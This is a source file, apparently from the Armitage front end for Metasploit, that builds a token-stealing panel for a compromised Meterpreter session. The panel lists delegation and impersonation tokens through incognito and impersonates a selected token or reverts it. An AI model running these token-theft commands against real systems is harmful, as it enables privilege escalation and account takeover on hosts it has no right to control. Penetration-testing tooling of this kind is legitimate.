#
# Token Stealing...
#

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;

sub updateTokenList {
	# update the dialog to indicate that things are changing...
	[$3 setEnabled: 0];
	[$3 setText: "Grabbing tokens..."];

	# setup incognito and list the tokens...
	m_cmd_callback($1, "use incognito", {});
	m_cmd_callback($1, "sysinfo", {});
	m_cmd_callback($1, "sysinfo", {});
	m_cmd_callback($1, "sysinfo", {});
	m_cmd_callback($1, "list_tokens -u", lambda({
		if ($0 eq "end") {
			local('$entry $row $type');
			[$model clear: 32];
			foreach $entry (split("\n", $2)) {
				$entry = ["$entry" trim];
				if ($entry eq "Delegation Tokens Available") {
					$type = "delegation";
				}
				else if ($entry eq "Impersonation Tokens Available") {
					$type = "impersonation";
				}
				else if ($entry ismatch '=*' || $entry eq "No tokens available" || " " isin $entry) {
					# do nothing...	
				}
				else if ($entry ne "") {
					$row = %();
					$row['Token Type'] = $type;
					$row['Name']       = $entry;
					[$model addEntry: $row];
				}
			}
			[$model fireListeners];

			dispatchEvent(lambda({
				[$refresh setEnabled: 1];
				[$refresh setText: "Refresh"];
			}, \$refresh));
		}
	}, $model => $2, $refresh => $3));
}

sub stealToken {
        local('$dialog $table $model $steal $revert $whoami $refresh');
        $dialog = [new JPanel];
        [$dialog setLayout: [new BorderLayout]];

        ($table, $model) = setupTable("Name", @("Token Type", "Name"), @());
	[$table setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
        [$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$steal = [new JButton: "Steal Token"];
	[$steal addActionListener: lambda({
		local('$value');
		$value = [$model getSelectedValue: $table];
		oneTimeShow("impersonate_token");
		m_cmd($sid, "impersonate_token ' $+ $value $+ '");
	}, $sid => $1, \$table, \$model)];

	$revert = [new JButton: "Revert to Self"];
	[$revert addActionListener: lambda({
		oneTimeShow("getuid");
		m_cmd($sid, "rev2self");
		m_cmd($sid, "getuid");
	}, $sid => $1)];

	$whoami = [new JButton: "Get UID"];
	[$whoami addActionListener: lambda({
		oneTimeShow("getuid");
		m_cmd($sid, "getuid");
	}, $sid => $1)];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		updateTokenList($sid, $model, $refresh);
	}, $sid => $1, \$model, \$refresh)];

	updateTokenList($1, $model, $refresh);

        [$dialog add: center($steal, $revert, $whoami, $refresh), [BorderLayout SOUTH]];
        [$frame addTab: "Tokens $1", $dialog, $null, "Tokens " . sessionToHost($1)];
}
